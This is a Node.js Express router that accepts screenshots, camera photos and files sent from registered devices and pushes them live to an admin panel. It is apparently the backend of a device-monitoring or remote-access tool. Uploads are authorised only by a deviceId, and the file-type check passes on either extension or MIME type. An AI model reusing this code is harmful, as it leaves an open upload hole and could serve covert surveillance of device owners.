const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const prisma = require('../lib/db');
const { v4: uuidv4 } = require('uuid');

const router = express.Router();

// Ensure upload directories exist
const uploadDirs = ['screenshots', 'photos', 'files'];
uploadDirs.forEach(dir => {
    const fullPath = path.join(__dirname, '../../uploads', dir);
    if (!fs.existsSync(fullPath)) {
        fs.mkdirSync(fullPath, { recursive: true });
    }
});

// Multer storage configuration
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.uploadType || 'files';
        cb(null, path.join(__dirname, '../../uploads', type));
    },
    filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${uuidv4()}${path.extname(file.originalname)}`;
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 50 * 1024 * 1024 }, // 50MB limit
    fileFilter: (req, file, cb) => {
        // Accept images and common file types
        const allowedTypes = /jpeg|jpg|png|gif|webp|mp4|mp3|pdf|doc|docx|txt/;
        const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
        const mimetype = allowedTypes.test(file.mimetype);
        if (extname || mimetype) {
            cb(null, true);
        } else {
            cb(new Error('Invalid file type'));
        }
    }
});

/**
 * Helper to find device by deviceId
 */
async function findDevice(deviceId) {
    return await prisma.device.findUnique({
        where: { deviceId }
    });
}

/**
 * POST /api/upload/screenshot
 * Upload screenshot from device
 */
router.post('/screenshot', (req, res, next) => {
    req.uploadType = 'screenshots';
    next();
}, upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        // Read file and convert to base64
        const filePath = req.file.path;
        const fileBuffer = fs.readFileSync(filePath);
        const base64Data = fileBuffer.toString('base64');
        const mimeType = req.file.mimetype || 'image/jpeg';

        // Store in database
        const screenshot = await prisma.screenshot.create({
            data: {
                deviceId: device.id,
                data: base64Data,
                fileName: req.file.originalname || req.file.filename,
                fileSize: req.file.size,
                mimeType: mimeType
            }
        });

        // Delete the temp file since we stored in DB
        fs.unlinkSync(filePath);

        // Emit to admin panel with data URL
        const io = req.app.get('io');
        if (io) {
            io.to('admin').emit('screenshot:new', {
                deviceId,
                screenshot: {
                    id: screenshot.id,
                    url: `data:${mimeType};base64,${base64Data}`,
                    timestamp: screenshot.timestamp
                }
            });
        }

        console.log(`[UPLOAD] Screenshot from ${deviceId}: stored in DB (${req.file.size} bytes)`);
        res.json({
            success: true,
            id: screenshot.id
        });
    } catch (error) {
        console.error('[UPLOAD] Screenshot error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload screenshot' });
    }
});

/**
 * POST /api/upload/photo
 * Upload photo from device camera
 */
router.post('/photo', (req, res, next) => {
    req.uploadType = 'photos';
    next();
}, upload.single('file'), async (req, res) => {
    try {
        const { deviceId, camera } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        // Read file and convert to base64
        const filePath = req.file.path;
        const fileBuffer = fs.readFileSync(filePath);
        const base64Data = fileBuffer.toString('base64');
        const mimeType = req.file.mimetype || 'image/jpeg';

        // Store in database
        const photo = await prisma.photo.create({
            data: {
                deviceId: device.id,
                data: base64Data,
                fileName: req.file.originalname || req.file.filename,
                fileSize: req.file.size,
                mimeType: mimeType,
                camera: camera || 'back'
            }
        });

        // Delete the temp file since we stored in DB
        fs.unlinkSync(filePath);

        // Emit to admin panel with data URL
        const io = req.app.get('io');
        if (io) {
            io.to('admin').emit('photo:new', {
                deviceId,
                photo: {
                    id: photo.id,
                    url: `data:${mimeType};base64,${base64Data}`,
                    camera: photo.camera,
                    timestamp: photo.timestamp
                }
            });
        }

        console.log(`[UPLOAD] Photo (${camera}) from ${deviceId}: stored in DB (${req.file.size} bytes)`);
        res.json({
            success: true,
            id: photo.id
        });
    } catch (error) {
        console.error('[UPLOAD] Photo error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload photo' });
    }
});

/**
 * POST /api/upload/file
 * Generic file upload from device
 */
router.post('/file', (req, res, next) => {
    req.uploadType = 'files';
    next();
}, upload.single('file'), async (req, res) => {
    try {
        const { deviceId } = req.body;

        if (!deviceId) {
            return res.status(400).json({ success: false, error: 'Device ID required' });
        }

        const device = await findDevice(deviceId);
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        if (!req.file) {
            return res.status(400).json({ success: false, error: 'No file uploaded' });
        }

        console.log(`[UPLOAD] File from ${deviceId}: ${req.file.filename}`);
        res.json({
            success: true,
            url: `/uploads/files/${req.file.filename}`,
            filename: req.file.filename,
            size: req.file.size
        });
    } catch (error) {
        console.error('[UPLOAD] File error:', error);
        res.status(500).json({ success: false, error: 'Failed to upload file' });
    }
});

module.exports = router;
